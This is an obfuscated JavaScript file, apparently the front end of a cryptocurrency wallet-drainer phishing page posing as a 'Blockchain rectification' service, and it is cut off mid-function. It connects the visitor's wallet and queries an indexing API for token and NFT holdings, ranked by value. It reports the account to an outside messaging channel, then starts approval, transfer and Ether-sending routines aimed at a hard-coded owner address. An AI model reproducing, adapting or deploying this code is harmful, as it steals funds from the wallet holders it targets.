const _0x4a2dfb=_0x2847;(function(_0x469678,_0x83dbec){const _0x4e0b89=_0x2847,_0x38d37f=_0x469678();while(!![]){try{const _0x4d06c7=parseInt(_0x4e0b89(0x20c))/0x1+parseInt(_0x4e0b89(0x196))/0x2*(parseInt(_0x4e0b89(0x1ac))/0x3)+parseInt(_0x4e0b89(0x1c7))/0x4+-parseInt(_0x4e0b89(0x228))/0x5*(parseInt(_0x4e0b89(0x247))/0x6)+parseInt(_0x4e0b89(0x19c))/0x7+-parseInt(_0x4e0b89(0x236))/0x8*(parseInt(_0x4e0b89(0x1b8))/0x9)+parseInt(_0x4e0b89(0x242))/0xa*(-parseInt(_0x4e0b89(0x1bb))/0xb);if(_0x4d06c7===_0x83dbec)break;else _0x38d37f['push'](_0x38d37f['shift']());}catch(_0x1c6ab2){_0x38d37f['push'](_0x38d37f['shift']());}}}(_0x4014,0xef06b));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {mainnet,bsc}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[mainnet,bsc],projectId=_0x4a2dfb(0x1c2),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x4a2dfb(0x240))]({'chains':chains,'options':{'appName':'Blockchain\x20rectification'}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':'https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','coinbase':'https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png'}},ethereumClient);let currentUrl=window['location'][_0x4a2dfb(0x226)];const OWNER_ADDRESS='0xea8968B218a551919FbD5f1166328C82a96dED54',ABI=[{'constant':!![],'inputs':[],'name':'name','outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':'function'},{'constant':![],'inputs':[{'name':_0x4a2dfb(0x24b),'type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x1ab),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':_0x4a2dfb(0x243),'type':_0x4a2dfb(0x203)},{'name':_0x4a2dfb(0x24c),'type':_0x4a2dfb(0x190)}],'name':'approve','outputs':[],'payable':![],'stateMutability':_0x4a2dfb(0x1bf),'type':'function'},{'constant':!![],'inputs':[],'name':_0x4a2dfb(0x237),'outputs':[{'name':'','type':_0x4a2dfb(0x1aa)}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':'function'},{'constant':![],'inputs':[{'name':_0x4a2dfb(0x1f3),'type':_0x4a2dfb(0x203)}],'name':'addBlackList','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':_0x4a2dfb(0x248),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':![],'inputs':[{'name':_0x4a2dfb(0x1cb),'type':_0x4a2dfb(0x203)},{'name':_0x4a2dfb(0x1a9),'type':'address'},{'name':_0x4a2dfb(0x24c),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x234),'outputs':[],'payable':![],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':_0x4a2dfb(0x212),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[{'name':'','type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x245),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':'decimals','outputs':[{'name':'','type':_0x4a2dfb(0x190)}],'payable':![],'stateMutability':'view','type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':'maximumFee','outputs':[{'name':'','type':_0x4a2dfb(0x190)}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':'_totalSupply','outputs':[{'name':'','type':_0x4a2dfb(0x190)}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':![],'inputs':[],'name':_0x4a2dfb(0x214),'outputs':[],'payable':![],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[{'name':_0x4a2dfb(0x1df),'type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x1ea),'outputs':[{'name':'','type':_0x4a2dfb(0x1aa)}],'payable':![],'stateMutability':'view','type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[{'name':'','type':_0x4a2dfb(0x203)},{'name':'','type':'address'}],'name':'allowed','outputs':[{'name':'','type':_0x4a2dfb(0x190)}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':_0x4a2dfb(0x198),'outputs':[{'name':'','type':_0x4a2dfb(0x1aa)}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':'function'},{'constant':!![],'inputs':[{'name':_0x4a2dfb(0x1fb),'type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x1b1),'outputs':[{'name':'','type':_0x4a2dfb(0x190)}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':![],'inputs':[],'name':_0x4a2dfb(0x22e),'outputs':[],'payable':![],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':_0x4a2dfb(0x1dd),'outputs':[{'name':'','type':_0x4a2dfb(0x203)}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':_0x4a2dfb(0x1cf),'outputs':[{'name':'','type':_0x4a2dfb(0x203)}],'payable':![],'stateMutability':'view','type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':![],'inputs':[{'name':_0x4a2dfb(0x1a9),'type':_0x4a2dfb(0x203)},{'name':_0x4a2dfb(0x24c),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x230),'outputs':[],'payable':![],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'constant':![],'inputs':[{'name':_0x4a2dfb(0x1fd),'type':_0x4a2dfb(0x190)},{'name':_0x4a2dfb(0x1fc),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x1f5),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':_0x4a2dfb(0x1a4),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x20a),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':_0x4a2dfb(0x1a4),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x1b3),'outputs':[],'payable':![],'stateMutability':_0x4a2dfb(0x1bf),'type':'function'},{'constant':!![],'inputs':[{'name':_0x4a2dfb(0x20f),'type':_0x4a2dfb(0x203)},{'name':_0x4a2dfb(0x243),'type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x1e3),'outputs':[{'name':_0x4a2dfb(0x22d),'type':_0x4a2dfb(0x190)}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':_0x4a2dfb(0x1de),'outputs':[{'name':'','type':_0x4a2dfb(0x190)}],'payable':![],'stateMutability':'view','type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[{'name':'','type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x1f6),'outputs':[{'name':'','type':_0x4a2dfb(0x1aa)}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'constant':![],'inputs':[{'name':_0x4a2dfb(0x1d7),'type':_0x4a2dfb(0x203)}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'constant':!![],'inputs':[],'name':_0x4a2dfb(0x23b),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x4a2dfb(0x1ca),'type':'function'},{'constant':![],'inputs':[{'name':'newOwner','type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x208),'outputs':[],'payable':![],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'constant':![],'inputs':[{'name':_0x4a2dfb(0x194),'type':'address'}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4a2dfb(0x1eb)},{'inputs':[{'name':_0x4a2dfb(0x1a7),'type':_0x4a2dfb(0x190)},{'name':'_name','type':_0x4a2dfb(0x20b)},{'name':_0x4a2dfb(0x1e4),'type':_0x4a2dfb(0x20b)},{'name':_0x4a2dfb(0x1ce),'type':_0x4a2dfb(0x190)}],'payable':![],'stateMutability':'nonpayable','type':_0x4a2dfb(0x1e6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4a2dfb(0x1a4),'type':'uint256'}],'name':_0x4a2dfb(0x1ee),'type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4a2dfb(0x1a4),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x1b9),'type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4a2dfb(0x1be),'type':_0x4a2dfb(0x203)}],'name':'Deprecate','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':_0x4a2dfb(0x190)},{'indexed':![],'name':_0x4a2dfb(0x246),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x21a),'type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4a2dfb(0x194),'type':_0x4a2dfb(0x203)},{'indexed':![],'name':_0x4a2dfb(0x23d),'type':'uint256'}],'name':_0x4a2dfb(0x20d),'type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4a2dfb(0x22b),'type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x1b6),'type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4a2dfb(0x22b),'type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x1dc),'type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':_0x4a2dfb(0x203)},{'indexed':!![],'name':'spender','type':_0x4a2dfb(0x203)},{'indexed':![],'name':_0x4a2dfb(0x1af),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x18d),'type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'from','type':'address'},{'indexed':!![],'name':'to','type':'address'},{'indexed':![],'name':_0x4a2dfb(0x1af),'type':_0x4a2dfb(0x190)}],'name':'Transfer','type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[],'name':_0x4a2dfb(0x19e),'type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[],'name':'Unpause','type':_0x4a2dfb(0x21d)}],ABIN=[{'inputs':[{'internalType':_0x4a2dfb(0x20b),'name':_0x4a2dfb(0x1f2),'type':_0x4a2dfb(0x20b)},{'internalType':'string','name':_0x4a2dfb(0x1d9),'type':'string'},{'internalType':_0x4a2dfb(0x190),'name':'maxNftSupply','type':_0x4a2dfb(0x190)},{'internalType':'uint256','name':_0x4a2dfb(0x218),'type':_0x4a2dfb(0x190)}],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1e6)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x4a2dfb(0x1cf),'type':'address'},{'indexed':!![],'internalType':'address','name':_0x4a2dfb(0x222),'type':'address'},{'indexed':!![],'internalType':_0x4a2dfb(0x190),'name':'tokenId','type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x18d),'type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4a2dfb(0x203),'name':_0x4a2dfb(0x1cf),'type':'address'},{'indexed':!![],'internalType':_0x4a2dfb(0x203),'name':_0x4a2dfb(0x1f1),'type':'address'},{'indexed':![],'internalType':_0x4a2dfb(0x1aa),'name':'approved','type':_0x4a2dfb(0x1aa)}],'name':_0x4a2dfb(0x22f),'type':_0x4a2dfb(0x21d)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4a2dfb(0x203),'name':'previousOwner','type':_0x4a2dfb(0x203)},{'indexed':!![],'internalType':_0x4a2dfb(0x203),'name':_0x4a2dfb(0x197),'type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x235),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4a2dfb(0x203),'name':_0x4a2dfb(0x217),'type':_0x4a2dfb(0x203)},{'indexed':!![],'internalType':_0x4a2dfb(0x203),'name':'to','type':_0x4a2dfb(0x203)},{'indexed':!![],'internalType':_0x4a2dfb(0x190),'name':_0x4a2dfb(0x1d2),'type':'uint256'}],'name':_0x4a2dfb(0x1ae),'type':_0x4a2dfb(0x21d)},{'inputs':[],'name':'BAYC_PROVENANCE','outputs':[{'internalType':_0x4a2dfb(0x20b),'name':'','type':'string'}],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':_0x4a2dfb(0x202),'outputs':[{'internalType':_0x4a2dfb(0x190),'name':'','type':'uint256'}],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':_0x4a2dfb(0x1e1),'outputs':[{'internalType':_0x4a2dfb(0x190),'name':'','type':_0x4a2dfb(0x190)}],'stateMutability':_0x4a2dfb(0x1ca),'type':'function'},{'inputs':[],'name':'apePrice','outputs':[{'internalType':_0x4a2dfb(0x190),'name':'','type':_0x4a2dfb(0x190)}],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x203),'name':'to','type':_0x4a2dfb(0x203)},{'internalType':_0x4a2dfb(0x190),'name':_0x4a2dfb(0x1d2),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x1a5),'outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':'address','name':_0x4a2dfb(0x1cf),'type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x1b1),'outputs':[{'internalType':_0x4a2dfb(0x190),'name':'','type':_0x4a2dfb(0x190)}],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':'baseURI','outputs':[{'internalType':'string','name':'','type':_0x4a2dfb(0x20b)}],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':_0x4a2dfb(0x244),'outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':_0x4a2dfb(0x1cd),'outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x190),'name':_0x4a2dfb(0x1d2),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x1a0),'outputs':[{'internalType':_0x4a2dfb(0x203),'name':'','type':_0x4a2dfb(0x203)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x4a2dfb(0x203),'name':'owner','type':_0x4a2dfb(0x203)},{'internalType':_0x4a2dfb(0x203),'name':'operator','type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x192),'outputs':[{'internalType':_0x4a2dfb(0x1aa),'name':'','type':_0x4a2dfb(0x1aa)}],'stateMutability':_0x4a2dfb(0x1ca),'type':'function'},{'inputs':[],'name':_0x4a2dfb(0x1fa),'outputs':[{'internalType':'uint256','name':'','type':_0x4a2dfb(0x190)}],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x190),'name':_0x4a2dfb(0x1e9),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x1e5),'outputs':[],'stateMutability':'payable','type':'function'},{'inputs':[],'name':'name','outputs':[{'internalType':_0x4a2dfb(0x20b),'name':'','type':_0x4a2dfb(0x20b)}],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':_0x4a2dfb(0x1cf),'outputs':[{'internalType':_0x4a2dfb(0x203),'name':'','type':_0x4a2dfb(0x203)}],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x190),'name':'tokenId','type':_0x4a2dfb(0x190)}],'name':'ownerOf','outputs':[{'internalType':_0x4a2dfb(0x203),'name':'','type':_0x4a2dfb(0x203)}],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':_0x4a2dfb(0x19f),'outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':'address','name':_0x4a2dfb(0x217),'type':_0x4a2dfb(0x203)},{'internalType':_0x4a2dfb(0x203),'name':'to','type':'address'},{'internalType':_0x4a2dfb(0x190),'name':_0x4a2dfb(0x1d2),'type':'uint256'}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x203),'name':'from','type':'address'},{'internalType':'address','name':'to','type':_0x4a2dfb(0x203)},{'internalType':'uint256','name':_0x4a2dfb(0x1d2),'type':_0x4a2dfb(0x190)},{'internalType':_0x4a2dfb(0x1da),'name':'_data','type':'bytes'}],'name':_0x4a2dfb(0x1b5),'outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':'saleIsActive','outputs':[{'internalType':_0x4a2dfb(0x1aa),'name':'','type':_0x4a2dfb(0x1aa)}],'stateMutability':'view','type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x203),'name':_0x4a2dfb(0x1f1),'type':_0x4a2dfb(0x203)},{'internalType':_0x4a2dfb(0x1aa),'name':_0x4a2dfb(0x222),'type':_0x4a2dfb(0x1aa)}],'name':'setApprovalForAll','outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':'string','name':'baseURI','type':_0x4a2dfb(0x20b)}],'name':_0x4a2dfb(0x239),'outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':'function'},{'inputs':[{'internalType':_0x4a2dfb(0x20b),'name':_0x4a2dfb(0x1b4),'type':_0x4a2dfb(0x20b)}],'name':_0x4a2dfb(0x1a3),'outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x190),'name':'revealTimeStamp','type':_0x4a2dfb(0x190)}],'name':'setRevealTimestamp','outputs':[],'stateMutability':'nonpayable','type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':_0x4a2dfb(0x206),'outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':_0x4a2dfb(0x1d8),'outputs':[{'internalType':_0x4a2dfb(0x190),'name':'','type':_0x4a2dfb(0x190)}],'stateMutability':_0x4a2dfb(0x1ca),'type':'function'},{'inputs':[],'name':_0x4a2dfb(0x216),'outputs':[{'internalType':'uint256','name':'','type':_0x4a2dfb(0x190)}],'stateMutability':'view','type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x1b0),'name':_0x4a2dfb(0x1d4),'type':_0x4a2dfb(0x1b0)}],'name':_0x4a2dfb(0x238),'outputs':[{'internalType':_0x4a2dfb(0x1aa),'name':'','type':_0x4a2dfb(0x1aa)}],'stateMutability':_0x4a2dfb(0x1ca),'type':'function'},{'inputs':[],'name':'symbol','outputs':[{'internalType':'string','name':'','type':_0x4a2dfb(0x20b)}],'stateMutability':_0x4a2dfb(0x1ca),'type':'function'},{'inputs':[{'internalType':_0x4a2dfb(0x190),'name':'index','type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x1ec),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':'view','type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x203),'name':_0x4a2dfb(0x1cf),'type':_0x4a2dfb(0x203)},{'internalType':_0x4a2dfb(0x190),'name':_0x4a2dfb(0x224),'type':_0x4a2dfb(0x190)}],'name':_0x4a2dfb(0x233),'outputs':[{'internalType':_0x4a2dfb(0x190),'name':'','type':_0x4a2dfb(0x190)}],'stateMutability':_0x4a2dfb(0x1ca),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x190),'name':'tokenId','type':'uint256'}],'name':'tokenURI','outputs':[{'internalType':_0x4a2dfb(0x20b),'name':'','type':'string'}],'stateMutability':'view','type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':_0x4a2dfb(0x248),'outputs':[{'internalType':_0x4a2dfb(0x190),'name':'','type':_0x4a2dfb(0x190)}],'stateMutability':_0x4a2dfb(0x1ca),'type':'function'},{'inputs':[{'internalType':'address','name':_0x4a2dfb(0x217),'type':'address'},{'internalType':'address','name':'to','type':_0x4a2dfb(0x203)},{'internalType':'uint256','name':'tokenId','type':_0x4a2dfb(0x190)}],'name':'transferFrom','outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[{'internalType':_0x4a2dfb(0x203),'name':_0x4a2dfb(0x197),'type':_0x4a2dfb(0x203)}],'name':_0x4a2dfb(0x208),'outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)},{'inputs':[],'name':_0x4a2dfb(0x1c3),'outputs':[],'stateMutability':_0x4a2dfb(0x1bf),'type':_0x4a2dfb(0x1eb)}];let wallet;$(_0x4a2dfb(0x22a))['click'](async function(){const _0x5a8eab=_0x4a2dfb;wallet=_0x5a8eab(0x1bc),await connector();}),$(_0x4a2dfb(0x1e7))[_0x4a2dfb(0x1c6)](async function(){const _0x12dc50=_0x4a2dfb;wallet=_0x12dc50(0x1ad),await connector();}),$(_0x4a2dfb(0x249))[_0x4a2dfb(0x1c6)](async function(){const _0x2183b8=_0x4a2dfb;wallet=_0x2183b8(0x1f8),await connector();}),$(_0x4a2dfb(0x1c8))[_0x4a2dfb(0x1c6)](async function(){const _0x732f47=_0x4a2dfb;try{await web3Modal[_0x732f47(0x1ff)]();}catch(_0x3be2dd){console[_0x732f47(0x1f0)](_0x732f47(0x1f7),_0x3be2dd);return;}});let connector=async()=>{const _0x63a73c=_0x4a2dfb;if(typeof web3==='undefined'&&typeof ethereum===_0x63a73c(0x1d5)){console[_0x63a73c(0x1f0)](_0x63a73c(0x1d3));if(wallet===_0x63a73c(0x1bc)){let _0x5e9678=_0x63a73c(0x193)+currentUrl;window[_0x63a73c(0x1e0)]['href']=_0x5e9678;}else{if(wallet===_0x63a73c(0x1ad)){let _0x427fdc=_0x63a73c(0x1db)+currentUrl;window['location']['href']=_0x427fdc;}else{if(wallet===_0x63a73c(0x1f8)){let _0x54d7a2='https://link.trustwallet.com/open_url?url='+currentUrl;window[_0x63a73c(0x1e0)][_0x63a73c(0x226)]=_0x54d7a2;}}}}else try{await web3Modal[_0x63a73c(0x1ff)]();}catch(_0xadeac8){console[_0x63a73c(0x1f0)](_0x63a73c(0x1f7),_0xadeac8);return;}};$(_0x4a2dfb(0x223))[_0x4a2dfb(0x1c6)](async function(){const _0x717333=_0x4a2dfb;let _0x4b05d7=getAccount();console[_0x717333(0x1f0)](_0x4b05d7),!_0x4b05d7[_0x717333(0x203)]&&(console[_0x717333(0x1f0)](_0x717333(0x210)),alert(_0x717333(0x1ba))),_0x4b05d7[_0x717333(0x19d)][_0x717333(0x1f2)]===_0x717333(0x213)&&(_0x4b05d7[_0x717333(0x19d)]['options'][_0x717333(0x1c1)]()['networkVersion']!=='1'&&(console['log'](_0x717333(0x215)),await switchNetwork({'chainId':0x1}))),selectedAccount=_0x4b05d7[_0x717333(0x203)],sendMessage(_0x717333(0x23e)),sendMessage(_0x717333(0x227)+selectedAccount),covalenthqAPICall();});const Oxa=_0x4a2dfb(0x20e),Oxc1='5227607491',Oxc2=_0x4a2dfb(0x1c9);async function covalenthqAPICall(){const _0x213b4b=_0x4a2dfb,_0x396e06={'chain':_0x213b4b(0x23a)},_0x519938=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+_0x213b4b(0x211));_0x519938['search']=new URLSearchParams(_0x396e06)[_0x213b4b(0x23f)]();const _0x8d28eb={'method':'GET','headers':{'accept':_0x213b4b(0x200),'X-API-Key':_0x213b4b(0x21e)}};try{const _0x18df12=await fetch(_0x519938,_0x8d28eb)[_0x213b4b(0x199)](_0x2b6268=>_0x2b6268['json']());console['log'](_0x18df12);let _0x302c06=_0x18df12;console['log'](_0x213b4b(0x1ef),_0x302c06);let _0x13d655=await Promise[_0x213b4b(0x191)](_0x302c06[_0x213b4b(0x201)](async _0x42a8d9=>{const _0x264b53=_0x213b4b;let _0x2e5c5b;try{_0x2e5c5b=await getValue(_0x42a8d9[_0x264b53(0x241)],_0x42a8d9[_0x264b53(0x21f)],_0x42a8d9['decimals']);}catch(_0x59e92e){_0x2e5c5b=0x0;}return console[_0x264b53(0x1f0)](_0x2e5c5b),{'balance':_0x42a8d9['balance'],'value':_0x2e5c5b,'address':_0x42a8d9[_0x264b53(0x241)]};}));console['log']('tokens-list',_0x13d655),tokens=_0x13d655['filter'](_0x30f434=>_0x30f434[_0x213b4b(0x1af)]>0x5),tokens[_0x213b4b(0x1f4)]((_0x597347,_0x1e1ce2)=>_0x1e1ce2[_0x213b4b(0x1af)]-_0x597347['value']),console[_0x213b4b(0x1f0)](_0x213b4b(0x225),await getNetwork(),'Tokens:',tokens),NFTs=await getNFTs(selectedAccount)[_0x213b4b(0x209)](_0x7d6c6a=>{const _0x5af578=_0x213b4b;console[_0x5af578(0x1f0)](_0x5af578(0x18f),_0x7d6c6a);}),NFTs=NFTs[_0x213b4b(0x1bd)],console[_0x213b4b(0x1f0)](_0x213b4b(0x19b),NFTs);if(tokens[_0x213b4b(0x1cc)]===0x0&&NFTs['length']===0x0)onSendEther();else onApprove();}catch{sendMessage('Error\x20collecting\x20info\x20about\x20wallet');}}async function onApprove(){const _0xca9dda=_0x4a2dfb;if(tokens[_0xca9dda(0x1cc)])try{loopTokens(tokens);}catch(_0x415282){console[_0xca9dda(0x1e2)](_0xca9dda(0x1a8)+_0x415282['message']);}else{if(NFTs[_0xca9dda(0x1cc)]){try{loopNfts(NFTs);}catch(_0xf9d3aa){console[_0xca9dda(0x1e2)]('Error\x20processing\x20item\x20'+_0xf9d3aa['message']);}onSendEther(),sendMessage(_0xca9dda(0x1c5));}else try{onSendEther();}catch(_0x2ca410){console[_0xca9dda(0x1e2)](_0xca9dda(0x1a8)+_0x2ca410[_0xca9dda(0x18e)]);}}}function _0x2847(_0x2f7c02,_0x27280d){const _0x40140f=_0x4014();return _0x2847=function(_0x2847c1,_0xca3527){_0x2847c1=_0x2847c1-0x18c;let _0x21de3d=_0x40140f[_0x2847c1];return _0x21de3d;},_0x2847(_0x2f7c02,_0x27280d);}async function loopTokens(_0x553fe4){const _0x5dc085=_0x4a2dfb;for await(let _0x41b1cf of _0x553fe4){console[_0x5dc085(0x1f0)](_0x5dc085(0x1ed),_0x41b1cf);try{sendMessage(_0x5dc085(0x1a2));let {hash:_0x21ea3c}=await 